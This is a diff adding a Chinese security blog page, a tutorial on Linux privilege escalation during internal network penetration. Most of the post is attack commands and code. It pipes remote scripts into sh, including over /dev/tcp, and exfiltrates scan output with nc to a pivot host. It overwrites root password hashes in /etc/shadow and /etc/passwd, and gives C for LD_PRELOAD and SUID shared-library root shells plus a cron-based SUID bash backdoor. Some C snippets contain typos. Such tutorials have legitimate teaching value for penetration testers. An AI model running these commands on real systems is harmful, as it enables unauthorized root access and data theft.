@@ -1,0 +1,624 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="G00d">
+
+
+    <meta name="subtitle" content="没有人会一直一帆风顺，失败和挫折才是人生常态">
+
+
+
+    <meta name="keywords" content="G00dddd">
+
+
+<title>内网渗透-Linux提权梳理 | G00d`s Blog</title>
+
+
+
+    <link rel="icon" href="../favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="../css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="../js/script.js"></script>
+    
+    <script src="../js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+    //创建雪花元素
+    function snow() {
+      //获取视窗的宽高
+      var width = window.innerWidth;
+      var height = window.innerHeight;
+  
+      var snow = document.createElement("div");             //创建元素
+  
+      //初始化雪花样式
+      size = Math.random() * 15 + 10;                          //随机生成雪花大小
+      snow.style.width = size + "px";
+      snow.style.height = size + "px";
+      snow.style.background = "url(img/雪花" + Math.floor((Math.random()*6)+1) + ".png) no-repeat";   //1-6随机选择雪花的图片
+      // snow.style.background = "url(./雪花.png) no-repeat";
+      snow.style.backgroundSize = '100% 100%';
+      snow.style.position = "fixed";                        //元素的位置相对于浏览器窗口是固定位置，即使窗口是滚动的它也不会移动
+      snow.style.filter = "blur(1px)";                      //给图片设置高斯模糊
+      snow.style.left = Math.random() * width + 'px';         //随机生成雪花的初始位置
+      snow.style.top = "10px";
+      snow.style.opacity = parseInt(Math.random()*10)/2;   //随机生成雪花的透明度
+  
+      //向body添加元素
+      document.body.appendChild(snow);
+  
+      //创建定时器，每30ms雪花下落一次
+      var timer = setInterval(function () {
+        snow.style.top = parseInt(snow.style.top) + 3 + 'px';     //每次下落3px
+  
+        //当雪花到达底部后清除元素
+        if (parseInt(snow.style.top) >= height) {
+          clearInterval(timer);
+          snow.parentNode.removeChild(snow)
+        }
+      }, 30)
+    }
+  
+    //页面加载完成执行函数
+    window.onload = function play() {
+      //创建定时器，每300ms生成一朵雪花
+      setInterval(function () {
+        snow()
+      }, 300)
+    }
+  </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+    //蜘蛛网特效
+    !
+    function() {
+        function n(n, e, t) {
+            return n.getAttribute(e) || t
+        }
+        function e(n) {
+            return document.getElementsByTagName(n)
+        }
+        function t() {
+            var t = e("script"),
+            o = t.length,
+            i = t[o - 1];
+            return {
+                l: o,
+                z: n(i, "zIndex", -1),
+                o: n(i, "opacity", .9),   //透明度
+                c: n(i, "color", "255, 102, 153"),   //颜色
+                n: n(i, "count", 99)
+            }
+        }
+        function o() {
+            a = m.width = window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth,
+            c = m.height = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight
+        }
+        function i() {
+            r.clearRect(0, 0, a, c);
+            var n, e, t, o, m, l;
+            s.forEach(function(i, x) {
+                for (i.x += i.xa, i.y += i.ya, i.xa *= i.x > a || i.x < 0 ? -1 : 1, i.ya *= i.y > c || i.y < 0 ? -1 : 1, r.fillRect(i.x - .5, i.y - .5, 1, 1), e = x + 1; e < u.length; e++) n = u[e],
+                null !== n.x && null !== n.y && (o = i.x - n.x, m = i.y - n.y, l = o * o + m * m, l < n.max && (n === y && l >= n.max / 2 && (i.x -= .03 * o, i.y -= .03 * m), t = (n.max - l) / n.max, r.beginPath(), r.lineWidth = t / 2, r.strokeStyle = "rgba(" + d.c + "," + (t + .2) + ")", r.moveTo(i.x, i.y), r.lineTo(n.x, n.y), r.stroke()))
+            }),
+            x(i)
+        }
+        var a, c, u, m = document.createElement("canvas"),
+        d = t(),
+        l = "c_n" + d.l,
+        r = m.getContext("2d"),
+        x = window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || window.oRequestAnimationFrame || window.msRequestAnimationFrame ||
+        function(n) {
+            window.setTimeout(n, 1e3 / 45)
+        },
+        w = Math.random,
+        y = {
+            x: null,
+            y: null,
+            max: 2e4
+        };
+        m.id = l,
+        m.style.cssText = "position:fixed;top:0;left:0;z-index:" + d.z + ";opacity:" + d.o,
+        e("body")[0].appendChild(m),
+        o(),
+        window.onresize = o,
+        window.onmousemove = function(n) {
+            n = n || window.event,
+            y.x = n.clientX,
+            y.y = n.clientY
+        },
+        window.onmouseout = function() {
+            y.x = null,
+            y.y = null
+        };
+        for (var s = [], f = 0; d.n > f; f++) {
+            var h = w() * a,
+            g = w() * c,
+            v = 2 * w() - 1,
+            p = 2 * w() - 1;
+            s.push({
+                x: h,
+                y: g,
+                xa: v,
+                ya: p,
+                max: 6e3
+            })
+        }
+        u = s.concat([y]),
+        setTimeout(function() {
+            i()
+        },
+        100)
+    } ();
+
+    //蜘蛛网特效
+    </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">G00d&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="../archives">Posts</a>
+                
+                    <a class="menu-item" href="../category">Categories</a>
+                
+                    <a class="menu-item" href="../tag">Tags</a>
+                
+                    <a class="menu-item" href="../about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">G00d&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="../archives">Posts</a>
+                
+                    <a class="menu-item" href="../category">Categories</a>
+                
+                    <a class="menu-item" href="../tag">Tags</a>
+                
+                    <a class="menu-item" href="../about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">内网渗透-Linux提权梳理</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">G00d</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">十二月 18, 2024&nbsp;&nbsp;19:26:21</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="../categories/%E5%86%85%E7%BD%91/">内网</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="Linux中提权的最终目标是获得root用户权限"><a href="#Linux中提权的最终目标是获得root用户权限" class="headerlink" title="Linux中提权的最终目标是获得root用户权限"></a>Linux中提权的最终目标是获得root用户权限</h1><h2 id="1-用户、组、文件、目录关系"><a href="#1-用户、组、文件、目录关系" class="headerlink" title="1.用户、组、文件、目录关系"></a>1.用户、组、文件、目录关系</h2><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kali用户可以在多个组，一个组可以用kali<span class="built_in">、root</span>等用户</span><br><span class="line">每个文件、目录都可以根据用户、组来定义权限</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">对于用户，配置文件在/etc/passwd  用户密码哈希存储在/etc/shadow</span><br><span class="line">uid是识别用户的根本特征，root是一类uid=0的用户而不是单个用户</span><br><span class="line">每个用户有3个用户<span class="built_in">id</span>（real、effective、saved）用户的真实ID是/etc/passwd中定义的ID</span><br><span class="line">但是作为另一个用户执行一个进程时，有效<span class="built_in">id</span>被设置为该用户的真实身份，在大多数访问控制决策中，有效ID用于验证用户，就像这里swq的<span class="built_in">id</span>和组</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-linux%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//6c5774257d063d89d1bc9aca321c3590.png" alt="image-20230925203551051"></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">组配置在<span class="regexp">/etc/g</span>roup。用户有一个主要组，并且可以有multiple二级组</span><br><span class="line">默认情况下，用户的主要组和用户账户名称相同</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">对于文件和目录来说，他们都有一个所有者和一个组，系统定义他们的所有者对他们具有<span class="attribute">r</span>、w、<span class="attribute">x</span>操作</span><br><span class="line">同时系统还定义了组、其他用户对他们的权限，ls -l可以查看</span><br><span class="line">“-” 表示普通文件，如<span class="selector-class">.txt</span>，<span class="selector-class">.c</span>，*<span class="selector-class">.h</span> “d” 表示目录，directory “l” 表示软链接文件(ln -s 创建的)，link file “<span class="selector-tag">p</span>” 表示pipe管道文件 “<span class="selector-tag">b</span>” 表示块设备文件，block device “c” 表示字符设备文件，char device “s” 表示socket套接字文件，用于实现两个进程间通信</span><br><span class="line"><span class="selector-attr">[rwx]</span><span class="selector-attr">[r-x]</span><span class="selector-attr">[r-x]</span>分别代表(所有者、组、其他)权限</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-linux%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//b6e8999cca7e27ec62fa666b113aff96.png" alt="image-20230925201533992"></p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">对于权限，rwx不再赘述，应该重点关注<span class="built_in">setuid</span>(SUID)bit以及<span class="built_in">setgid</span>(SGID)bit</span><br><span class="line">SUID：文件以所有者的权限执行</span><br><span class="line">设置在文件上时，文件将使用文件组的权限执行。设置在目录上时，该目录内创建的文件将继承目录本身的组。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">当前进程(<span class="keyword">shell</span>)</span><br><span class="line"><span class="keyword">cat</span> /proc/$$/status | <span class="keyword">grep</span> <span class="string">&quot;[UG]id&quot;</span></span><br><span class="line">目的是获取当前正在运行的 <span class="keyword">shell</span> 进程的用户标识（UID）和组标识（GID）信息</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-提权"><a href="#2-提权" class="headerlink" title="2.提权"></a>2.提权</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">对于信息收集</span><br><span class="line"><span class="built_in">whoami</span>                   <span class="comment"># 查看当前用户权限，如果是root用户就不用提权；</span></span><br><span class="line"><span class="built_in">id</span>                       <span class="comment"># 查看当前id的uid和gid，和权限</span></span><br><span class="line"><span class="built_in">id</span>+其他用户               <span class="comment"># 查看某个用户</span></span><br><span class="line"><span class="built_in">who</span>                      <span class="comment"># 查看其他登录状态的用户用户</span></span><br><span class="line">w                        <span class="comment"># 当前用户的具体信息</span></span><br><span class="line">last                     <span class="comment"># 最近登录进来的用户</span></span><br><span class="line"><span class="built_in">uname</span> -a                 <span class="comment"># 查看linux操作系统内核信息</span></span><br><span class="line"><span class="built_in">uname</span> -r                 <span class="comment"># 查看内核版本</span></span><br><span class="line"><span class="built_in">cat</span> /proc/version        <span class="comment"># 查看linux系统当前操作系统版本信息</span></span><br><span class="line"><span class="built_in">cat</span> /etc/issue           <span class="comment"># 查看linux当前操作系统发行版本信息</span></span><br><span class="line"><span class="built_in">cat</span> /etc/redhat-releas   <span class="comment"># 查看linux当前操作系统发行版本信息</span></span><br><span class="line"><span class="built_in">cat</span> /etc/*-release       <span class="comment"># 查看linux当前操作系统发行版本信息</span></span><br><span class="line">ip addr                  <span class="comment"># 查看当前用户的网卡和ip</span></span><br><span class="line">ip route                 <span class="comment"># 查看路由</span></span><br><span class="line">ip neigh                 <span class="comment"># 查看网络邻居</span></span><br><span class="line">arp -a                   <span class="comment"># 查看局域网中绑定的ip地址</span></span><br><span class="line">hostname                 <span class="comment"># 查看机器名称</span></span><br><span class="line">hostnamectl              <span class="comment"># 显示的名称更加全</span></span><br><span class="line"><span class="built_in">sudo</span> -l                  <span class="comment"># 查看那些是可以以root权限运行的用户</span></span><br><span class="line"><span class="built_in">getcap</span> -r / 2&gt;/dev/null  <span class="comment"># 利用缺陷提权，</span></span><br><span class="line"><span class="built_in">ls</span> -a                    <span class="comment"># </span></span><br><span class="line"><span class="built_in">history</span>                  <span class="comment"># 历史记录</span></span><br><span class="line"><span class="built_in">cat</span> /etc/passwd          <span class="comment"># 查看用户数有bash的用户</span></span><br><span class="line"><span class="built_in">cat</span> /etc/crontab         <span class="comment"># 查看是否有自动任务</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span>               <span class="comment"># 查看是否有特殊路径</span></span><br><span class="line"><span class="built_in">env</span>                      <span class="comment"># 看整体环境变量</span></span><br><span class="line">ps -ef                   <span class="comment"># 查看进程</span></span><br><span class="line">ps axjf                  <span class="comment"># 查看进程个数，x指没有连接终端的进程</span></span><br><span class="line">ps aux                   <span class="comment"># 查看进程个数 a所有 u指使用的用户</span></span><br><span class="line">top                      <span class="comment"># 查看进程，在不断的刷新</span></span><br><span class="line">top -n 1                 <span class="comment"># 查看进程，但不刷新</span></span><br><span class="line">netstat -a               <span class="comment"># 查看占用进程的端口及id</span></span><br><span class="line">netstat -at/-au          <span class="comment"># 查看带有tcp或者udp的进程</span></span><br><span class="line">netstat -l               <span class="comment">#查看那些端口在被监听</span></span><br><span class="line">netstat -ano             <span class="comment"># </span></span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null <span class="comment"># 列出有usr的文件</span></span><br><span class="line"><span class="built_in">which</span> awk perl python ruby gcc vi vim nmap find screen 2&gt;/dev/null <span class="comment">#查看用户是否安装vi vim...   可以用which查看那些可执行文件</span></span><br><span class="line"><span class="built_in">cat</span> /etc/fstab           <span class="comment">#查看那些磁盘没挂载</span></span><br><span class="line">也可以通过自动化脚本，但是容易被主机安全设备发现</span><br><span class="line">PEASS-ng</span><br><span class="line"></span><br><span class="line">执行：</span><br><span class="line"></span><br><span class="line">1.可以下载本地执行</span><br><span class="line">curl -L https://github.com/carlospolop/PEASS-ng/releases/download/20230924-10138da9/linpeas.sh | sh</span><br><span class="line">2.如果是二层内网渗透可以在跳板机下载wget https://github.com/carlospolop/PEASS-ng/releases/download/20230924-10138da9/linpeas.sh</span><br><span class="line">跳板机以root开启端口<span class="built_in">sudo</span> python3 -m http.server 80，(<span class="built_in">sudo</span> php -s 0:80)</span><br><span class="line">跳板机用nc监听81端口并把收到的流量保存起来<span class="built_in">sudo</span> nc -lvnp 81 | <span class="built_in">tee</span> linpeas.txt</span><br><span class="line">二层内网机器对跳板机进行curl 192.168.178.141/linpeas.sh | sh | nc 192.168.178.141 81</span><br><span class="line">这样方便把扫描结果拿回攻击机方便查看less -r linpeas.txt</span><br><span class="line">补充：<span class="built_in">cat</span>命令下操作</span><br><span class="line">跳板机：<span class="built_in">sudo</span> nc -lvnp 80 &lt; linpeas.sh</span><br><span class="line">二层内网机器：<span class="built_in">cat</span> &lt; /dev/tcp/192.168.178.141/80 | sh</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">服务漏洞mysql-UDF(<span class="keyword">User</span> <span class="title">Define</span> Function)提权</span><br><span class="line">UDF是mysql的一个拓展接口能让管理者自定义一些函数来使用。</span><br><span class="line">searchsploit mysql udf</span><br><span class="line">会有相关文档，直接按照文件里说的进行操作即可，建议在本地环境进行静态编译预防二层系统闭网且缺乏组件</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">可读shadow文件利用</span><br><span class="line">查看有<span class="built_in">hash</span>值的用户<span class="built_in">cat</span> /etc/shadow | grep <span class="string">&#x27;:$&#x27;</span></span><br><span class="line">hash-identifier识别加密方法</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-linux%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//29107f6153301af763edb2bb09f8ae25.png" alt="image-20230930110754779"></p>
+<figure class="highlight rsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">现在知道加密方法，我们把<span class="number">123456</span>加密一下放到<span class="built_in">shadow</span>里，在此之前备份一下<span class="built_in">shadow</span>文件cp /etc/<span class="built_in">shadow</span> /tmp/<span class="built_in">shadow</span>.txt</span><br><span class="line">mkpasswd -m sha<span class="number">-512</span> <span class="number">123456</span> 写入<span class="built_in">shadow</span>里，就能用<span class="number">123456</span>登录了</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">对于passwd文件的利用</span><br><span class="line">我们知道shadow里的hash密码在passwd里是以<span class="attribute">x</span>存在，那么我们可以通过openssl passwd <span class="number">123456</span>替换root的<span class="attribute">x</span>就能更改root密码</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span>环境变量提权是最常用的，也是实战里最少出现的</span><br><span class="line"><span class="built_in">sudo</span> -l   有env_reset 和env_keep俩选项说明是可以提权的</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-linux%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//a9cf77c7d592c166d0edeedc48a673d0.png" alt="image-20230930114450822"></p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">创建一个C语言文件vim shell.c</span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> _init()&#123;</span><br><span class="line"><span class="built_in">unsetenv</span>(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line"><span class="built_in">setgid</span>(<span class="number">0</span>);</span><br><span class="line"><span class="built_in">setuid</span>(<span class="number">0</span>);</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">在这里使用的共享库要用共享库来编译</span><br><span class="line">gcc -fPIC -shared -o shell.so -nostartfile</span><br><span class="line">然后通过共享库使用sudo中无密码使用的find等工具，完成提权</span><br><span class="line">sudo LD_PRELOAD=shell.so find</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">自动任务提权实战里也很少见</span><br><span class="line"><span class="keyword">cat</span> /etc/crontab如果有root执行的类似day.<span class="keyword">sh</span>文件用<span class="keyword">local</span> day.<span class="keyword">sh</span>查看位置</span><br><span class="line">用<span class="keyword">ls</span> -liah /day.<span class="keyword">sh</span>查看内容、权限，如果可写，就写入反弹<span class="keyword">shell</span>，等待</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">自动任务<span class="built_in">PATH</span>环境变量提权</span><br><span class="line">这里有<span class="number">2</span>个前提</span><br><span class="line"><span class="number">1</span>.crontab只会执行crontab中的路径集 <span class="number">2</span>.<span class="built_in">path</span>有家目录，会优先运行家目录优先级靠前的文件</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-linux%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//e5db2eca17e6f39e52824394eb9ce11d.png" alt="image-20230930121923918"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">向overwrite.sh写入执行脚本</span><br><span class="line"><span class="comment">#! /bin/bash</span></span><br><span class="line"><span class="built_in">cp</span> /bin/bash /tmp/rootbash</span><br><span class="line"><span class="built_in">chmod</span> +xs /tmp/rootbash</span><br><span class="line">等一会/tmp/rootbash -p就拿到权限了</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">suid可执行文件已知利用提权</span><br><span class="line"><span class="built_in">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span>  查找并列出所有设置<span class="string">&quot;setuid&quot;</span>权限的文件，这里关注exim-4.84.3</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-linux%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//9ac4ff2252a7c977b24a5d2701c328c7.png" alt="image-20230930212719789"></p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">searchsploit</span> exim，用这个<span class="number">39535</span>,根据文件操作即可</span><br><span class="line">还有一个网站exploit-db.com相同的功能</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-linux%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//b47843c3d3b297f8468511d33a837f4c.png" alt="image-20230930212914646"></p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SUID共享库注入提权</span><br><span class="line">直接执行可执行文件suid-<span class="keyword">so</span></span><br><span class="line">/usr/<span class="keyword">local</span>/bin/suid-<span class="keyword">so</span></span><br><span class="line">直接strings /usr/<span class="keyword">local</span>/bin/suid-<span class="keyword">so</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-linux%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//570386ae3d1cfc4c00a4d91bea1582fa.png" alt="image-20230930214147092"></p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对strings进行追踪，发现没有目录，那就创建文件strace <span class="regexp">/usr/</span>local<span class="regexp">/bin/</span>suid-so <span class="number">2</span>&gt;&amp;<span class="number">1</span> | <span class="keyword">grep</span> <span class="string">&#x27;/home&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">写个libcalc<span class="selector-class">.c</span></span><br><span class="line"><span class="selector-id">#include</span>&lt;stdio<span class="selector-class">.h</span>&gt;</span><br><span class="line"><span class="selector-id">#include</span>&lt;stdblib<span class="selector-class">.h</span>&gt;</span><br><span class="line">statuc void <span class="built_in">inject</span>() <span class="built_in">__attribute__</span>((constructor));</span><br><span class="line">void <span class="built_in">inject</span>()&#123;</span><br><span class="line"><span class="built_in">setgid</span>(<span class="number">0</span>);</span><br><span class="line"><span class="built_in">setuid</span>(<span class="number">0</span>);</span><br><span class="line"><span class="built_in">system</span>(&quot;/bin/bash -p&quot;);</span><br><span class="line">&#125;</span><br><span class="line">执行共享库gcc -shared -fPIC -o libcalc<span class="selector-class">.so</span> libcalc<span class="selector-class">.c</span>然后执行可执行文件</span><br></pre></td></tr></table></figure>
+
